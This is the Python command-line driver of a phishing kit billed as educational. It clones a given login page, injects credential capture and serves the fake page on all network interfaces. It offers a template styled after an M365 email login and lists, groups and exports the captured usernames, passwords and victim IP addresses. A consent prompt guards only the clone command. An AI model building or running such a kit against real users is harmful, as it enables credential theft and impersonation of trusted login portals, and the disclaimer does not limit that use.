#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════╗
║        MASU Phishing Kit v1.0                ║
║  Educational Use Only — MASU Cyber Academy   ║
╚══════════════════════════════════════════════╝

Usage:
  python3 masu-phish.py clone <url>           Clone a real webpage
  python3 masu-phish.py demo [template]        Serve a built-in demo template
  python3 masu-phish.py serve [port]           Serve the cloned page
  python3 masu-phish.py logs                   View captured credentials
  python3 masu-phish.py logs --export out.json Export logs to JSON
  python3 masu-phish.py templates              List built-in templates
  python3 masu-phish.py clear                  Clear all logs and output
"""

import sys
import os
import shutil
import argparse
from cloner.cloner import Cloner
from server.server import PhishServer
from logger.logger import Logger

BASE_DIR      = os.path.dirname(os.path.abspath(__file__))
TEMPLATES_DIR = os.path.join(BASE_DIR, "templates")
OUTPUT_DIR    = os.path.join(BASE_DIR, "output")

BANNER = r"""
███╗   ███╗ █████╗ ███████╗██╗   ██╗
████╗ ████║██╔══██╗██╔════╝██║   ██║
██╔████╔██║███████║███████╗██║   ██║
██║╚██╔╝██║██╔══██║╚════██║██║   ██║
██║ ╚═╝ ██║██║  ██║███████║╚██████╔╝
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝
  Phishing Kit v1.0 — Educational Use Only
  MASU Cyber Academy | github.com/Maty156
"""

DISCLAIMER = """
╔══════════════════════════════════════════════════════════════╗
║                    ⚠  LEGAL DISCLAIMER ⚠                    ║
║                                                              ║
║  This tool is for EDUCATIONAL purposes only.                 ║
║  Use ONLY on systems you own or have written permission to   ║
║  test. Unauthorized phishing attacks are ILLEGAL.            ║
║                                                              ║
║  By continuing, you confirm you have legal authorization.    ║
╚══════════════════════════════════════════════════════════════╝
"""

TEMPLATES = {
    "demo":       ("demo-login.html",      "Generic corporate login portal"),
    "cloudmail":  ("cloudmail-login.html", "Email client login (M365-style)"),
}


def require_consent():
    print(DISCLAIMER)
    ans = input("Do you have written permission to test this target? [yes/no]: ").strip().lower()
    if ans != "yes":
        print("\n[!] Aborted. Only use this tool on authorized targets.\n")
        sys.exit(0)


# ── commands ──────────────────────────────────────────────────────────────────

def cmd_clone(args):
    require_consent()
    print(f"\n[*] Cloning: {args.url}\n")
    c = Cloner(args.url)
    out_path = c.clone()
    if out_path:
        print(f"\n[+] Cloned to: {out_path}")
        print(f"[*] Run: python3 masu-phish.py serve\n")
    else:
        print("\n[-] Clone failed. Check the URL and your internet connection.\n")


def cmd_demo(args):
    """Copy a built-in template to output/ and serve it."""
    key = (args.template or "demo").lower()
    if key not in TEMPLATES:
        print(f"\n[-] Unknown template '{key}'. Run 'python3 masu-phish.py templates' to list options.\n")
        sys.exit(1)

    filename, desc = TEMPLATES[key]
    src = os.path.join(TEMPLATES_DIR, filename)
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    dst = os.path.join(OUTPUT_DIR, "index.html")
    shutil.copy(src, dst)

    port = args.port if args.port else 8080
    print(f"\n[+] Demo template : {key} — {desc}")
    print(f"[+] Serving on    : http://0.0.0.0:{port}")
    print(f"[+] Captures logged to output/credentials.db")
    print(f"[*] Press Ctrl+C to stop.\n")
    PhishServer(port=port, directory=OUTPUT_DIR).start()


def cmd_serve(args):
    port = args.port if args.port else 8080
    index = os.path.join(OUTPUT_DIR, "index.html")
    if not os.path.exists(index):
        print("\n[-] No page found in output/. Run 'clone <url>' or 'demo' first.\n")
        sys.exit(1)

    # Show meta info if available
    meta_path = os.path.join(OUTPUT_DIR, "meta.txt")
    if os.path.exists(meta_path):
        with open(meta_path) as f:
            for line in f:
                print(f"  {line.strip()}")

    print(f"\n[+] Serving phishing page on http://0.0.0.0:{port}")
    print(f"[+] Credential log: output/credentials.db")
    print(f"[*] Press Ctrl+C to stop.\n")
    PhishServer(port=port, directory=OUTPUT_DIR).start()


def cmd_logs(args):
    logger = Logger()
    entries = logger.get_all()

    if args.export:
        logger.export_json(args.export)
        return

    if not entries:
        print("\n[*] No credentials captured yet.\n")
        return

    # Group by timestamp+ip for cleaner display
    seen = {}
    for e in entries:
        key = f"{e['timestamp']}|{e['ip']}"
        seen.setdefault(key, []).append(e)

    print()
    for i, (key, group) in enumerate(seen.items(), 1):
        ts, ip = key.split("|")
        print(f"  ── Capture #{i}  [{ts}]  IP: {ip}")
        for e in group:
            print(f"     {e['field']:<22} → {e['value']}")
    print(f"\n  Total sessions captured: {len(seen)}\n")


def cmd_templates(args):
    print("\n  Built-in templates:\n")
    for key, (filename, desc) in TEMPLATES.items():
        print(f"    {key:<14} — {desc}")
        print(f"    {'':14}   python3 masu-phish.py demo {key}\n")


def cmd_clear(args):
    confirm = input("[!] This will delete all cloned pages and logs. Continue? [yes/no]: ").strip().lower()
    if confirm != "yes":
        print("[*] Aborted.\n")
        return
    if os.path.exists(OUTPUT_DIR):
        shutil.rmtree(OUTPUT_DIR)
        os.makedirs(OUTPUT_DIR)
    print("[+] Cleared all output and logs.\n")


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="MASU Phishing Kit — Educational phishing page cloner",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    sub = parser.add_subparsers(dest="command")

    # clone
    p_clone = sub.add_parser("clone", help="Clone a webpage and inject credential capture")
    p_clone.add_argument("url", help="Target URL (e.g. https://example.com/login)")

    # demo
    p_demo = sub.add_parser("demo", help="Serve a built-in demo template")
    p_demo.add_argument("template", nargs="?", default="demo",
                        help="Template name (default: demo). Run 'templates' to list.")
    p_demo.add_argument("--port", "-p", type=int, default=8080)

    # serve
    p_serve = sub.add_parser("serve", help="Serve the cloned page and capture submissions")
    p_serve.add_argument("port", nargs="?", type=int, default=8080)

    # logs
    p_logs = sub.add_parser("logs", help="View captured credentials")
    p_logs.add_argument("--export", "-e", metavar="FILE",
                        help="Export all captures to a JSON file")

    # templates
    sub.add_parser("templates", help="List built-in demo templates")

    # clear
    sub.add_parser("clear", help="Delete all cloned pages and logs")

    args = parser.parse_args()

    dispatch = {
        "clone":     cmd_clone,
        "demo":      cmd_demo,
        "serve":     cmd_serve,
        "logs":      cmd_logs,
        "templates": cmd_templates,
        "clear":     cmd_clear,
    }

    fn = dispatch.get(args.command)
    if fn:
        fn(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
